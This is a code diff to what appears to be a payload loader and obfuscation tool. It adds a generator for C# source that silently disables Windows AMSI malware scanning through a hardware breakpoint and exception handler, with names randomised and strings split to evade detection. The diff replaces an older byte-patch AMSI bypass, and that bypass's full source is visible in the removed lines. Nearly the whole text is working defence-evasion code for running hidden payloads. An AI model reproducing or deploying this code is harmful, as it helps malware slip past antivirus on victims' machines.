@@ -138,6 +138,133 @@ def _generate_junk_class(used_names: set[str] | None = None) -> str:
     return "\n".join(lines)
 
 
+# ── HWBP+VEH AMSI bypass (patchless) ──────────────────────────────────
+
+def _hwbp_veh_bypass_cs(cls_name: str, method_name: str, *, public: bool) -> str:
+    """Generate C# source for patchless AMSI bypass via hardware breakpoint + VEH.
+
+    Instead of writing bytes into AmsiScanBuffer (detected by Defender), this
+    sets a hardware breakpoint on the function entry using DR0.  When the CLR
+    calls AmsiScanBuffer, the CPU fires EXCEPTION_SINGLE_STEP.  A Vectored
+    Exception Handler intercepts this, writes AMSI_RESULT_CLEAN to the 5th
+    parameter, sets RAX = S_OK, and redirects RIP to the return address —
+    the function never executes.
+    """
+    vis = "public" if public else "internal"
+    # Field names are randomised to avoid signature matching
+    addr_field = _plausible_field()
+    handler_field = _plausible_field()
+    return (
+        "using System;\n"
+        "using System.Runtime.InteropServices;\n\n"
+        f"{vis} static class {cls_name}\n"
+        "{{\n"
+        f"    private static IntPtr {addr_field} = IntPtr.Zero;\n\n"
+        "    private delegate int VehDelegate(IntPtr info);\n"
+        f"    private static readonly VehDelegate {handler_field} = VehCallback;\n\n"
+        "    [StructLayout(LayoutKind.Sequential)]\n"
+        "    private struct EXCEPTION_RECORD\n"
+        "    {{\n"
+        "        public uint ExceptionCode;\n"
+        "        public uint ExceptionFlags;\n"
+        "        public IntPtr ExceptionRecord;\n"
+        "        public IntPtr ExceptionAddress;\n"
+        "        public uint NumberParameters;\n"
+        "    }}\n\n"
+        "    [StructLayout(LayoutKind.Sequential)]\n"
+        "    private struct EXCEPTION_POINTERS\n"
+        "    {{\n"
+        "        public IntPtr ExceptionRecord;\n"
+        "        public IntPtr ContextRecord;\n"
+        "    }}\n\n"
+        f"    {vis} static void {method_name}()\n"
+        "    {{\n"
+        "        try\n"
+        "        {{\n"
+        '            var lib = LoadLibrary("am" + "si.d" + "ll");\n'
+        "            if (lib == IntPtr.Zero) return;\n"
+        '            {addr_field} = GetProcAddress(lib, "Amsi" + "Scan" + "Buffer");\n'
+        f"            if ({addr_field} == IntPtr.Zero) return;\n\n"
+        f"            AddVectoredExceptionHandler(1, {handler_field});\n"
+        f"            SetHwBp({addr_field});\n"
+        "        }}\n"
+        "        catch {{ }}\n"
+        "    }}\n\n"
+        "    private static int VehCallback(IntPtr infoPtr)\n"
+        "    {{\n"
+        "        var ep = Marshal.PtrToStructure<EXCEPTION_POINTERS>(infoPtr);\n"
+        "        var rec = Marshal.PtrToStructure<EXCEPTION_RECORD>(ep.ExceptionRecord);\n\n"
+        "        // EXCEPTION_SINGLE_STEP = 0x80000004\n"
+        "        if (rec.ExceptionCode != 0x80000004)\n"
+        "            return 0; // EXCEPTION_CONTINUE_SEARCH\n\n"
+        f"        if (rec.ExceptionAddress != {addr_field})\n"
+        "            return 0;\n\n"
+        "        // x64 CONTEXT offsets (Windows SDK):\n"
+        "        // Rax=0x78, Rsp=0x98, Rip=0xF8\n"
+        "        // At function entry: [RSP]=return addr, 5th param at [RSP+0x28]\n"
+        "        var rsp = Marshal.ReadIntPtr(ep.ContextRecord, 0x98);\n"
+        "        var retAddr = Marshal.ReadIntPtr(rsp);\n"
+        "        var amsiResultPtr = Marshal.ReadIntPtr(rsp + 0x28);\n\n"
+        "        if (amsiResultPtr != IntPtr.Zero)\n"
+        "            Marshal.WriteInt32(amsiResultPtr, 0); // AMSI_RESULT_CLEAN\n\n"
+        "        // Set RIP to return address (skip function body)\n"
+        "        Marshal.WriteIntPtr(ep.ContextRecord, 0xF8, retAddr);\n"
+        "        // Pop return address from stack (RSP += 8)\n"
+        "        Marshal.WriteIntPtr(ep.ContextRecord, 0x98, rsp + 8);\n"
+        "        // RAX = S_OK (0)\n"
+        "        Marshal.WriteIntPtr(ep.ContextRecord, 0x78, IntPtr.Zero);\n\n"
+        "        return -1; // EXCEPTION_CONTINUE_EXECUTION\n"
+        "    }}\n\n"
+        "    private static void SetHwBp(IntPtr addr)\n"
+        "    {{\n"
+        "        var tid = GetCurrentThreadId();\n"
+        "        // THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME\n"
+        "        var th = OpenThread(0x001A, false, tid);\n"
+        "        if (th == IntPtr.Zero) return;\n\n"
+        "        // x64 CONTEXT size = 1232 bytes\n"
+        "        var ctx = Marshal.AllocHGlobal(1232);\n"
+        "        try\n"
+        "        {{\n"
+        "            for (int i = 0; i < 1232; i++)\n"
+        "                Marshal.WriteByte(ctx, i, 0);\n\n"
+        "            // ContextFlags = CONTEXT_DEBUG_REGISTERS (0x00100010)\n"
+        "            Marshal.WriteInt32(ctx, 0x30, 0x00100010);\n"
+        "            GetThreadContext(th, ctx);\n\n"
+        "            // Dr0 at offset 0x350 — set breakpoint address\n"
+        "            Marshal.WriteIntPtr(ctx, 0x350, addr);\n"
+        "            // Dr7 at offset 0x370 — enable local DR0 (bit 0)\n"
+        "            var dr7 = (long)Marshal.ReadIntPtr(ctx, 0x370);\n"
+        "            Marshal.WriteIntPtr(ctx, 0x370, new IntPtr(dr7 | 0x1));\n\n"
+        "            Marshal.WriteInt32(ctx, 0x30, 0x00100010);\n"
+        "            SetThreadContext(th, ctx);\n"
+        "        }}\n"
+        "        finally\n"
+        "        {{\n"
+        "            Marshal.FreeHGlobal(ctx);\n"
+        "            CloseHandle(th);\n"
+        "        }}\n"
+        "    }}\n\n"
+        '    [DllImport("kernel32.dll")]\n'
+        "    private static extern IntPtr LoadLibrary(string n);\n"
+        '    [DllImport("kernel32.dll")]\n'
+        "    private static extern IntPtr GetProcAddress(IntPtr h, string n);\n"
+        '    [DllImport("kernel32.dll")]\n'
+        "    private static extern IntPtr AddVectoredExceptionHandler(\n"
+        "        uint first, VehDelegate handler);\n"
+        '    [DllImport("kernel32.dll")]\n'
+        "    private static extern uint GetCurrentThreadId();\n"
+        '    [DllImport("kernel32.dll")]\n'
+        "    private static extern IntPtr OpenThread(uint access, bool inherit, uint tid);\n"
+        '    [DllImport("kernel32.dll")]\n'
+        "    private static extern bool GetThreadContext(IntPtr hThread, IntPtr ctx);\n"
+        '    [DllImport("kernel32.dll")]\n'
+        "    private static extern bool SetThreadContext(IntPtr hThread, IntPtr ctx);\n"
+        '    [DllImport("kernel32.dll")]\n'
+        "    private static extern bool CloseHandle(IntPtr h);\n"
+        "}}\n"
+    ).format(addr_field=addr_field)
+
+
 # ── Loader generation ───────────────────────────────────────────────────
 
 def _xor_encrypt(data: bytes, key: bytes) -> bytes:
@@ -215,34 +342,10 @@ def _generate_loader_project(
         "</Project>\n"
     )
 
-    # Write AmsiBypass.cs — AMSI patch to disable Assembly.Load scanning
+    # Write AmsiBypass.cs — HWBP+VEH bypass (patchless, sets hardware breakpoint
+    # on AmsiScanBuffer and intercepts via Vectored Exception Handler)
     (project_dir / "AmsiBypass.cs").write_text(
-        "using System;\n"
-        "using System.Runtime.InteropServices;\n\n"
-        f"internal static class {amsi_cls}\n"
-        "{\n"
-        f"    internal static void {amsi_method}()\n"
-        "    {\n"
-        "        try\n"
-        "        {\n"
-        '            var h = LoadLibrary("amsi.dll");\n'
-        "            if (h == IntPtr.Zero) return;\n"
-        '            var p = GetProcAddress(h, "AmsiScanBuffer");\n'
-        "            if (p == IntPtr.Zero) return;\n"
-        "            VirtualProtect(p, 6, 0x40, out var o);\n"
-        "            Marshal.Copy(new byte[]{0xB8,0x57,0x00,0x07,0x80,0xC3}, 0, p, 6);\n"
-        "            VirtualProtect(p, 6, o, out _);\n"
-        "        }\n"
-        "        catch { }\n"
-        "    }\n\n"
-        '    [DllImport("kernel32.dll")]\n'
-        "    private static extern IntPtr LoadLibrary(string n);\n"
-        '    [DllImport("kernel32.dll")]\n'
-        "    private static extern IntPtr GetProcAddress(IntPtr h, string n);\n"
-        '    [DllImport("kernel32.dll")]\n'
-        "    private static extern bool VirtualProtect(IntPtr a, uint s, "
-        "uint p, out uint o);\n"
-        "}\n"
+        _hwbp_veh_bypass_cs(amsi_cls, amsi_method, public=False)
     )
 
     # Write Program.cs — the loader (calls AMSI bypass before Assembly.Load)
@@ -374,31 +477,7 @@ class DotnetEmbedPass:
             method = _plausible_name()
 
             (tmp_path / "Bypass.cs").write_text(
-                "using System;\n"
-                "using System.Runtime.InteropServices;\n\n"
-                f"public static class {cls}\n"
-                "{\n"
-                f"    public static void {method}()\n"
-                "    {\n"
-                "        try {\n"
-                '            var h = LoadLibrary("ams" + "i.dll");\n'
-                "            if (h == IntPtr.Zero) return;\n"
-                '            var p = GetProcAddress(h, "Ams" + "iScanB" + "uffer");\n'
-                "            if (p == IntPtr.Zero) return;\n"
-                "            VirtualProtect(p, 6, 0x40, out var o);\n"
-                "            Marshal.Copy(new byte[]{0xB8,0x57,0x00,0x07,0x80,0xC3},"
-                " 0, p, 6);\n"
-                "            VirtualProtect(p, 6, o, out _);\n"
-                "        } catch { }\n"
-                "    }\n\n"
-                '    [DllImport("kernel32.dll")]\n'
-                "    static extern IntPtr LoadLibrary(string n);\n"
-                '    [DllImport("kernel32.dll")]\n'
-                "    static extern IntPtr GetProcAddress(IntPtr h, string n);\n"
-                '    [DllImport("kernel32.dll")]\n'
-                "    static extern bool VirtualProtect(IntPtr a, uint s, "
-                "uint p, out uint o);\n"
-                "}\n"
+                _hwbp_veh_bypass_cs(cls, method, public=True)
             )
 
             out_dir = tmp_path / "out"
